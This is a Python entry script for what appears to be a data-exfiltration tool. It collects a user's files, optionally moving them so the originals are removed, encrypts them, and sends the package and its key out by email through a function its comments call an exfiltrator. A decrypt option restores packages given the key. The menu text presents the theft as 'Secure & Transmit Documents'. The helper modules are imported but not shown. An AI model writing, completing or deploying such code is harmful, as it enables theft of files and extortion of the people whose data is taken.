
import os
from collector_file import file_collector
from encryptor_file import encrypt_folder
from exfiltrator_file import exfiltrator_sender_file
from decryptor_file import Archive_decryptor


def main():
    print("\n=== Welcome! Choose an option ===")
    print("1) Secure & Transmit Documents")
    print("2) Unlock Protected Package")
    choice = input("Select [1/2]: ").strip()

    if choice == '1':
        # Step 1: Ask how to collect
        print("\nHow would you like to handle the files?")
        print("a) Copy files (keep originals)")
        print("b) Move files (remove originals)")
        mode = input("Select [a/b]: ").strip().lower()

        if mode not in {'a', 'b'}:
            print("❌ Invalid selection. Exiting.")
            return

        copy_mode = (mode == 'a')
        file_collector(copy_mode=copy_mode)

        # Step 2: Encrypt folder
        enc_path, key = encrypt_folder()

        # Step 3: Exfiltrate via email
        exfiltrator_sender_file("Protected Documents", enc_path, key)

    elif choice == '2':
        # Step 1: Provide inputs for decryption
        enc_path = input("\nProvide the full path to the secured package: ").strip()
        key_hex = input("Provide the protection code (hexadecimal): ").strip()

        if not os.path.isfile(enc_path):
            print("❌ Provided file path does not exist. Exiting.")
            return

        try:
            Archive_decryptor(enc_path, key_hex)
        except Exception as e:
            print(f"⚠️ Decryption failed: {e}")

    else:
        print("❌ Invalid choice. Please select 1 or 2.")


if __name__ == "__main__":
    main()